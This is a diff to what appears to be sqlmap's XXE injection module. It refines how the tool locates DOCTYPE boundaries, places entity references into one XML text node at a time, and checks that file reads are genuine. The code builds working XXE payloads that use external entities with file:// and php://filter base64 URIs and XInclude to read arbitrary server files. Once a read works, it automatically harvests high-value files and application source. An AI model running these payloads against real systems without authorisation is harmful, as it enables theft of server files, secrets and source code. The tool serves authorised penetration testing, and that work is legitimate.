@@ -16,6 +16,7 @@ from lib.core.common import singleTimeWarnMessage
 from lib.core.convert import getBytes
 from lib.core.convert import getText
 from lib.core.convert import getUnicode
+from lib.core.convert import htmlUnescape
 from lib.core.data import conf
 from lib.core.data import kb
 from lib.core.data import logger
@@ -34,8 +35,13 @@ from lib.core.settings import XXE_WEBROOTS
 from lib.core.settings import OOB_POLL_ATTEMPTS
 from lib.core.settings import OOB_POLL_DELAY
 from lib.core.settings import XXE_LOCAL_DTDS
+from lib.core.settings import XXE_LOCATION_SWEEP_MAX
 from lib.core.settings import XXE_TIME_THRESHOLD
+from lib.core.settings import UPPER_RATIO_BOUND
 from lib.request.connect import Connect as Request
+from lib.utils.nonsql import ratio as _ratio
+from lib.utils.xrange import xrange
+from thirdparty.six.moves import urllib as _urllib
 
 # Fresh per-scan sentinel token. Deliberately a random opaque string (never
 # root:x:0:0 or similar) so it cannot collide with a WAF honeypot signature and
@@ -49,6 +55,11 @@ _MARKER = None
 
 # Cached answer to the one-time "use a public OOB service?" consent prompt (per scan).
 _OOB_CONSENT = None
+
+# Latched leaf text-node location that the in-band reflection sweep proved workable. Every subsequent
+# body-injection tier (`_placeRef` with index left as None) reuses it, so once the reflecting node is
+# found the file-read/harvest/XInclude tiers all target that same spot instead of always the first leaf.
+_PLACE_INDEX = 0
 
 # First element of the document (skipping the <?xml?> prolog, comments and any
 # DOCTYPE). Its name must match the DOCTYPE name or libxml2/Xerces reject the doc.
@@ -139,57 +150,152 @@ def _send(body):
         return ""
 
 
+def _scanDoctype(xml):
+    """Non-resolving lexical scan for a DOCTYPE declaration. Returns {start, subsetOpen, subsetClose,
+    end} byte offsets (subsetOpen/subsetClose None when there is no internal subset), or None when the
+    document has no DOCTYPE. Tracks quote state, comments and the internal subset so a '>' or ']>'
+    sitting inside a quoted entity value, a comment, or a nested markup declaration does NOT
+    prematurely terminate the scan - a plain regex mis-detects every one of those and either truncates
+    the DOCTYPE or finds a phantom subset close, corrupting the built payload. This scanner never
+    resolves entities or fetches external ids; it only locates boundaries."""
+    m = re.search(r"<!DOCTYPE\b", xml)
+    if not m:
+        return None
+    n = len(xml)
+    i = m.end()
+    subsetOpen = subsetClose = None
+    quote = None
+    while i < n:
+        c = xml[i]
+        if quote:
+            if c == quote:
+                quote = None
+            i += 1
+        elif xml.startswith("<!--", i):
+            end = xml.find("-->", i + 4)
+            i = (end + 3) if end != -1 else n
+        elif c in ('"', "'"):
+            quote = c
+            i += 1
+        elif c == '[' and subsetOpen is None:
+            subsetOpen = i
+            j, depth, iq = i + 1, 0, None
+            while j < n:                        # scan the internal subset to its matching ']'
+                cj = xml[j]
+                if iq:
+                    if cj == iq:
+                        iq = None
+                    j += 1
+                elif xml.startswith("<!--", j):
+                    e = xml.find("-->", j + 4)
+                    j = (e + 3) if e != -1 else n
+                elif cj in ('"', "'"):
+                    iq = cj
+                    j += 1
+                elif cj == ']' and depth == 0:
+                    subsetClose = j
+                    break
+                else:
+                    if cj == '<':
+                        depth += 1
+                    elif cj == '>' and depth > 0:
+                        depth -= 1
+                    j += 1
+            i = (subsetClose + 1) if subsetClose is not None else n
+        elif c == '>':
+            return {"start": m.start(), "subsetOpen": subsetOpen, "subsetClose": subsetClose, "end": i + 1}
+        else:
+            i += 1
+    return {"start": m.start(), "subsetOpen": subsetOpen, "subsetClose": subsetClose, "end": n}
+
+
+def _contentStart(xml):
+    """Offset at which document-element content begins: just past a DOCTYPE (located by the lexical
+    scanner, so a quoted '>' / comment / CDATA inside it is not mistaken for its end), else just past
+    the XML prolog, else 0. Text-node operations start here so they never touch the DTD."""
+    doctype = _scanDoctype(xml)
+    if doctype:
+        return doctype["end"]
+    prolog = re.match(r"\s*<\?xml.*?\?>", xml, flags=re.DOTALL)
+    return prolog.end() if prolog else 0
+
+
 def _buildDoctype(xml, rootName, internalSubset):
     """Prepend (or extend) a DOCTYPE carrying `internalSubset` into `xml`.
     A document may already declare a DOCTYPE - injecting a second one is invalid
     XML and every parser rejects it, so we splice into the existing declaration
-    instead (into its internal subset, or by adding one to a subset-less DOCTYPE)."""
+    instead (into its internal subset, or by adding one to a subset-less DOCTYPE).
+    Boundaries come from the lexical scanner, not a regex, so a quoted '>' or a
+    comment inside an existing DOCTYPE cannot misplace the splice."""
 
-    existing = re.search(r"<!DOCTYPE\s+[^>\[]*\[", xml)
-    if existing:
+    doctype = _scanDoctype(xml)
+    if doctype and doctype["subsetOpen"] is not None:
         # Splice our declarations into the existing internal subset.
-        insertAt = xml.index('[', existing.start()) + 1
+        insertAt = doctype["subsetOpen"] + 1
         return xml[:insertAt] + "\n" + internalSubset + "\n" + xml[insertAt:]
 
-    subsetless = re.search(r"<!DOCTYPE\s+[^>\[]*>", xml)
-    if subsetless:
+    if doctype:
         # DOCTYPE with an external id but no internal subset (e.g. SYSTEM "x.dtd"):
         # add an internal subset before its closing '>' (both may legally coexist).
-        close = xml.index('>', subsetless.start())
+        close = doctype["end"] - 1
         return xml[:close] + " [\n" + internalSubset + "\n]" + xml[close:]
 
-    doctype = "<!DOCTYPE %s [\n%s\n]>" % (rootName, internalSubset)
+    built = "<!DOCTYPE %s [\n%s\n]>" % (rootName, internalSubset)
     prolog = re.match(r"\s*<\?xml.*?\?>", xml, flags=re.DOTALL)
     if prolog:
         end = prolog.end()
-        return xml[:end] + "\n" + doctype + xml[end:]
-    return doctype + "\n" + xml
+        return xml[:end] + "\n" + built + xml[end:]
+    return built + "\n" + xml
 
 
-def _placeRef(xml, snippet, attrs=False):
-    """Insert `snippet` (an entity reference or an XInclude element) into EVERY leaf
-    text node - not just the first - so detection does not depend on which field the
-    application happens to reflect. When `attrs` is set (internal-entity tier only),
-    also seed existing attribute values, since a general internal entity legally
-    expands inside an attribute (external entity refs do NOT - never seed attributes
-    for the external/XInclude tiers or the document becomes ill-formed). Falls back to
-    injecting just before the root's closing tag when there is no text node at all."""
+def _textNodeCount(xml):
+    """Number of leaf text nodes `_placeRef` can target (for callers that sweep one location at a
+    time). Excludes the DOCTYPE, mirroring `_placeRef` (via the lexical `_contentStart`)."""
+    return len(_TEXTNODE_RE.findall(xml[_contentStart(xml):]))
+
+
+def _sweepLocations(xml):
+    """Ordered list of leaf-text-node indices for a body-injection tier to try, bounded by
+    XXE_LOCATION_SWEEP_MAX so a document with many text nodes cannot explode the request count. When
+    the user pinned an explicit injection marker there is exactly one spot, so no sweep is needed."""
+    if _MARKER and _MARKER in xml:
+        return [0]
+    return list(xrange(min(max(1, _textNodeCount(xml)), XXE_LOCATION_SWEEP_MAX)))
+
+
+def _placeRef(xml, snippet, attrs=False, index=None):
+    """Insert `snippet` (an entity reference or an XInclude element) into ONE leaf text node - the
+    `index`-th - PRESERVING every other value. Replacing every leaf (and, in the internal-entity tier,
+    every attribute) at once corrupted the whole document: schema validation, XML signatures/checksums,
+    authentication values, IDs and routing fields were all destroyed, which both causes false negatives
+    (the app rejects the mutated document, unrelated to entity handling) and can trigger application-side
+    actions on altered values. An explicit '*'/marker still wins. When `attrs` is set and there is no
+    text node, seeds ONE attribute value. `index` None (the default) uses the latched `_PLACE_INDEX` -
+    the location the reflection sweep proved workable - so downstream read tiers reuse it; the sweep
+    itself passes an explicit `index` 0..N-1 (see `_textNodeCount`) to try each location individually.
+    `snippet` is placed in exactly one spot per call so the rest of the document stays well-formed and
+    semantically intact."""
+
+    if index is None:
+        index = _PLACE_INDEX
 
     if _MARKER and _MARKER in xml:
         return xml.replace(_MARKER, snippet)   # honour the user's explicit injection point
 
-    start = re.search(r"\]>", xml).end() if "]>" in xml else 0
+    start = _contentStart(xml)                 # skip the DOCTYPE via the lexical scanner (quote/comment safe)
     head, tail = xml[:start], xml[start:]
-    tail, count = _TEXTNODE_RE.subn(lambda _: ">" + snippet + "<", tail)
+
+    matches = list(_TEXTNODE_RE.finditer(tail))
+    if matches:
+        m = matches[index if 0 <= index < len(matches) else 0]
+        return head + tail[:m.start()] + ">" + snippet + "<" + tail[m.end():]
     if attrs:
-        # Seed every attribute value except namespace declarations (xmlns / xmlns:*),
-        # whose rewriting would break the document. Only touches simple, entity-free
-        # values (the '[^"\'<>&]*' class) so we never corrupt existing markup.
-        tail, acount = re.subn(r'''(\s(?!xmlns[:=])[\w.:-]+\s*=\s*)("|')[^"'<>&]*\2''',
-                               lambda m: "%s%s%s%s" % (m.group(1), m.group(2), snippet, m.group(2)), tail)
-        count += acount
-    if count:
-        return head + tail
+        # a general internal entity legally expands inside an attribute value; seed ONE attribute
+        # (never xmlns) when the document has no text node. External-entity/XInclude tiers must not
+        # request this (an external ref in an attribute is ill-formed).
+        am = re.search(r'''(\s(?!xmlns[:=])[\w.:-]+\s*=\s*)("|')[^"'<>&]*\2''', tail)
+        if am:
+            return head + tail[:am.start()] + "%s%s%s%s" % (am.group(1), am.group(2), snippet, am.group(2)) + tail[am.end():]
 
     rootName = _rootName(xml)
     if rootName:
@@ -229,11 +335,11 @@ def _echoed(page):
     return False
 
 
-def _report(title, payload):
+def _report(title, payload, vulnType="XXE injection"):
     if conf.beep:
         beep()
     place = conf.method or HTTPMETHOD.POST
-    conf.dumper.singleString("---\nParameter: XML body (%s)\n    Type: XXE injection\n    Title: %s\n    Payload: %s\n---" % (place, title, payload))
+    conf.dumper.singleString("---\nParameter: XML body (%s)\n    Type: %s\n    Title: %s\n    Payload: %s\n---" % (place, vulnType, title, payload))
 
 
 def _saveFileRead(remoteFile, content):
@@ -349,15 +455,16 @@ def _harvestSource(xml, rootName, harvested):
     return result
 
 
-def _tryInternal(xml, rootName, baseline):
+def _tryInternal(xml, rootName, baseline, index=None):
     """T2 in-band: an internal general entity expands to the sentinel and is
     reflected. Guarded by a negative control (sentinel absent from baseline) and
     a raw-echo guard (the literal '&ent;' must NOT survive - that would mean the
-    app merely mirrors the body without parsing entities)."""
+    app merely mirrors the body without parsing entities). `index` selects the leaf
+    text node to inject into (the sweep in `xxeScan` tries each in turn)."""
 
     ent = randomStr(length=8, lowercase=True)
     subset = '<!ENTITY %s "%s">' % (ent, SENTINEL)
-    payload = _placeRef(_buildDoctype(xml, rootName, subset), "&%s;" % ent, attrs=True)
+    payload = _placeRef(_buildDoctype(xml, rootName, subset), "&%s;" % ent, attrs=True, index=index)
     page = _send(payload)
 
     if SENTINEL in page and ("&%s;" % ent) not in page and not _echoed(page) and SENTINEL not in baseline:
@@ -378,35 +485,83 @@ def _confirmRead(page, pattern, baseline):
     return None
 
 
-def _tryInbandFileRead(xml, rootName, fileName):
-    """Read an arbitrary file IN-BAND on a reflective target: place the external
-    entity between two random markers so the exact file content can be sliced out
-    of the response regardless of surrounding template. Raw file:// works for text
-    files; php://filter base64 (PHP) carries files with XML-special bytes. Returns
-    (content, payload) or (None, None)."""
+def _normalizeEscaping(text):
+    """Bounded, non-resolving decode of the common reflection encodings (HTML entities, percent-
+    encoding, JS \\uXXXX / escaped slash) so an ESCAPED entity reference (&amp;e;, &#38;e;, &#x26;e;,
+    %26e%3B, \\u0026e;) is unmasked and can be recognised as reflection rather than file content."""
+    out = getUnicode(text)
+    for _ in range(3):                          # a few rounds catch double-encoding; capped
+        prev = out
+        try:
+            out = htmlUnescape(out)
+        except Exception:
+            pass
+        try:
+            out = _urllib.parse.unquote(out)
+        except Exception:
+            pass
+        out = out.replace("\\u0026", "&").replace("\\u003b", ";").replace("\\/", "/")
+        if out == prev:
+            break
+    return out
 
+
+def _readBetweenMarkers(xml, rootName, systemId, isB64, m1, m2):
+    """Read `systemId` via an external entity placed between markers `m1`/`m2`; slice, reject a
+    reflected (un-expanded) entity in any encoding, and base64-decode when requested. Returns
+    (content, payload) with content=None when nothing usable came back."""
     from lib.core.convert import decodeBase64
+    ent = randomStr(8, lowercase=True)
+    subset = '<!ENTITY %s SYSTEM "%s">' % (ent, systemId)
+    payload = _placeRef(_buildDoctype(xml, rootName, subset), "%s&%s;%s" % (m1, ent, m2))
+    page = getUnicode(_send(payload))
+    match = re.search(re.escape(m1) + r"(.*?)" + re.escape(m2), page, re.DOTALL)
+    if not match:
+        return None, payload
+    data = match.group(1)
+    # a reflected (not expanded) entity in ANY encoding: the random entity NAME survives de-escaping ->
+    # the parser echoed the reference, it did not resolve the external entity -> not file content
+    if not data.strip() or ent in _normalizeEscaping(data):
+        return None, payload
+    if isB64:
+        try:
+            data = getText(decodeBase64(data.strip()))        # strict base64 also validates real bytes
+        except Exception:
+            return None, payload
+        if not data or not data.strip() or ent in _normalizeEscaping(data):
+            return None, payload
+    return (data if (data and data.strip()) else None), payload
+
+
+def _tryInbandFileRead(xml, rootName, fileName):
+    """Read an arbitrary file IN-BAND on a reflective target. The strict php://filter base64 channel is
+    PREFERRED (self-validating: only real bytes decode). The raw file:// channel is guarded by a MATCHED
+    CONTROL - a read of a random NONEXISTENT path with identical markers: a gateway/sanitizer that
+    substitutes a fixed placeholder (e.g. '[external entity disabled]', an error string) returns the
+    SAME text regardless of path, so if the requested-path read is materially identical to the
+    nonexistent-path read it is NOT genuine content and is rejected. Returns (content, payload) or
+    (None, None)."""
 
     m1, m2 = randomStr(8, lowercase=True), randomStr(8, lowercase=True)
-    for systemId, isB64 in ((_toSystemId(fileName), False),
-                            ("php://filter/convert.base64-encode/resource=%s" % _toResource(fileName), True)):
-        ent = randomStr(8, lowercase=True)
-        subset = '<!ENTITY %s SYSTEM "%s">' % (ent, systemId)
-        payload = _placeRef(_buildDoctype(xml, rootName, subset), "%s&%s;%s" % (m1, ent, m2))
-        page = getUnicode(_send(payload))
-        match = re.search(re.escape(m1) + r"(.*?)" + re.escape(m2), page, re.DOTALL)
-        if not match:
-            continue
-        data = match.group(1)
-        if not data.strip() or ("&%s;" % ent) in data:   # empty read or un-expanded echo
-            continue
-        if isB64:
-            try:
-                data = getText(decodeBase64(data.strip()))
-            except Exception:
-                continue
-        if data and data.strip():
-            return data, payload
+
+    # (1) preferred: strict base64 (PHP) - decoding proves the bytes are real, no control needed
+    data, payload = _readBetweenMarkers(xml, rootName,
+                                        "php://filter/convert.base64-encode/resource=%s" % _toResource(fileName), True, m1, m2)
+    if data:
+        return data, payload
+
+    # (2) raw file:// with a nonexistent-path differential control
+    data, payload = _readBetweenMarkers(xml, rootName, _toSystemId(fileName), False, m1, m2)
+    if data:
+        bogus = _toSystemId("/%s/%s" % (randomStr(10, lowercase=True), randomStr(12, lowercase=True)))
+        control, _ = _readBetweenMarkers(xml, rootName, bogus, False, m1, m2)
+        if control is not None and _ratio(control, data) >= UPPER_RATIO_BOUND:
+            # a nonexistent path returned the same/similar text -> a path-independent placeholder, not
+            # the requested file's contents
+            logger.debug("XXE raw read of '%s' matches a nonexistent-path control; rejecting placeholder" % fileName)
+            return None, None
+        return data, payload
+
     return None, None
 
 
@@ -541,13 +696,14 @@ def _tryErrorExfil(xml, rootName, errorChannel=False):
     return None, None
 
 
-def _tryXInclude(xml, rootName, baseline):
+def _tryXInclude(xml, rootName, baseline, index=None):
     """T4 fallback when DOCTYPE/entities are unavailable: XInclude a benign file as
-    text. Confirmed when the file content appears in the response (baseline-guarded)."""
+    text. Confirmed when the file content appears in the response (baseline-guarded).
+    `index` selects the leaf text node to inject the <xi:include> into."""
 
     for systemId, pattern in XXE_IMPACT_FILES:
         snippet = '<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="%s" parse="text"/>' % systemId
-        payload = _placeRef(xml, snippet)
+        payload = _placeRef(xml, snippet, index=index)
         confirmed = _confirmRead(_send(payload), pattern, baseline)
         if confirmed:
             return payload, systemId, confirmed
@@ -737,9 +893,10 @@ def _tryOob(xml, rootName):
 
 
 def xxeScan():
-    global SENTINEL, _OOB_CONSENT
+    global SENTINEL, _OOB_CONSENT, _PLACE_INDEX
     SENTINEL = randomStr(length=12, lowercase=True)
     _OOB_CONSENT = None
+    _PLACE_INDEX = 0
 
     debugMsg = "'--xxe' is self-contained: it detects XML External Entity injection "
     debugMsg += "in the request body and, once confirmed, automatically harvests high-value "
@@ -769,7 +926,14 @@ def xxeScan():
     # then emit a SINGLE report block with the strongest confirmed vector and its real
     # payload (one report per finding, as with the other non-SQL engines). The internal
     # expansion is only reported on its own when no external-entity read is reachable.
-    payload, page = _tryInternal(xml, rootName, baseline)
+    payload = page = None
+    for _locIndex in _sweepLocations(xml):
+        payload, page = _tryInternal(xml, rootName, baseline, index=_locIndex)
+        if payload:
+            _PLACE_INDEX = _locIndex   # latch the reflecting location for every downstream read tier
+            if _locIndex:
+                logger.debug("in-band reflection confirmed at leaf text-node location #%d" % _locIndex)
+            break
     if payload:
         expansionSeen = True
         logger.info("the XML body processes DTD/internal entities (in-band reflection confirmed)")
@@ -782,15 +946,16 @@ def xxeScan():
                 _report("In-band file read ('%s')" % conf.fileRead, readPayload)
                 _dumpFileRead(conf.fileRead, content)
         else:
-            # No targeted '--file-read': proactively harvest a curated set of high-value
-            # files (data stays in the response, no third party) - the XXE analogue of
-            # the automatic dumping the other non-SQL engines do once confirmed.
+            # No targeted '--file-read': AUTO-HARVEST a curated set of high-value files (the data
+            # stays in the response, no third party). `--xxe` is an auxiliary, self-contained switch
+            # - users generally don't know which file to request, so once an in-band read primitive
+            # is confirmed we harvest by default (the XXE analogue of the other non-SQL engines'
+            # automatic dumping). A specific target still overrides via '--file-read <path>'.
             harvested = _harvestFiles(xml, rootName)
             if harvested:
                 found = True
                 firstPath, _, firstPayload = harvested[0]
-                # follow-up: server-side application source disclosure (php://filter)
-                harvested += _harvestSource(xml, rootName, harvested)
+                harvested += _harvestSource(xml, rootName, harvested)   # server-side app source (php://filter)
                 logger.info("in-band XXE file-read impact confirmed; harvested %d file(s)" % len(harvested))
                 _report("In-band file read (auto-harvest, e.g. '%s')" % firstPath, firstPayload)
                 saved = []
@@ -804,9 +969,8 @@ def xxeScan():
                 if saved:
                     conf.dumper.rFile(saved)
             else:
-                # Harvest read nothing (content relocated in the response, or only benign
-                # host-identity is exposed): fall back to the pattern-based impact proof
-                # so file-read impact is still confirmed.
+                # harvest read nothing (content relocated, or only benign host-identity exposed):
+                # fall back to the pattern-based impact proof so file-read impact is still confirmed
                 systemId, readPayload = _tryExternalFile(xml, rootName, baseline)
                 if not systemId:
                     readPayload = _tryPhpFilter(xml, rootName, baseline)
@@ -817,9 +981,12 @@ def xxeScan():
                     _report("In-band file-read impact (external entity '%s')" % systemId, readPayload)
 
         if not found:
-            # external entities are disabled (only internal expansion is reachable):
-            # report that weaker-but-real finding with its actual payload
-            _report("In-band DTD/internal entity expansion", payload)
+            # Only INTERNAL general-entity expansion is reachable - external retrieval / local file
+            # access / XInclude / OOB were NOT proven. That is a parser-configuration weakness, NOT a
+            # confirmed XXE (which requires external resolution). Report it as its own, weaker finding
+            # so it is not conflated with a true external-entity XXE.
+            _report("DTD/internal general entity expansion enabled (external entity access NOT confirmed)",
+                    payload, vulnType="XML parser configuration")
 
     # T3: error-based (works where entities are not reflected but errors leak). A
     # redundant detection channel once in-band reflection was already seen, so it is
@@ -853,13 +1020,16 @@ def xxeScan():
             _report("Error-based in-band file read ('%s')" % fileName, "<error-based exfiltration of '%s'>" % fileName)
             _dumpFileRead(fileName, content)
 
-    # T4: XInclude fallback (no DOCTYPE/entity control needed)
+    # T4: XInclude fallback (no DOCTYPE/entity control needed). Reflection never latched a location
+    # here, so sweep the leaf text nodes (a schema-rejected or non-parsed first leaf otherwise hides it).
     if not found:
-        payload, systemId, snippet = _tryXInclude(xml, rootName, baseline)
-        if payload:
-            found = True
-            logger.info("the XML body is vulnerable to XInclude file read ('%s'): '%s'" % (systemId, snippet))
-            _report("XInclude file read ('%s')" % systemId, payload)
+        for _locIndex in _sweepLocations(xml):
+            payload, systemId, snippet = _tryXInclude(xml, rootName, baseline, index=_locIndex)
+            if payload:
+                found = True
+                logger.info("the XML body is vulnerable to XInclude file read ('%s'): '%s'" % (systemId, snippet))
+                _report("XInclude file read ('%s')" % systemId, payload)
+                break
 
     # T5: WAF-evasion fallbacks (UTF-16 re-encoding, PUBLIC-for-SYSTEM). The UTF-16
     # variant re-detects internal-entity reflection, so it is redundant (and mislabels
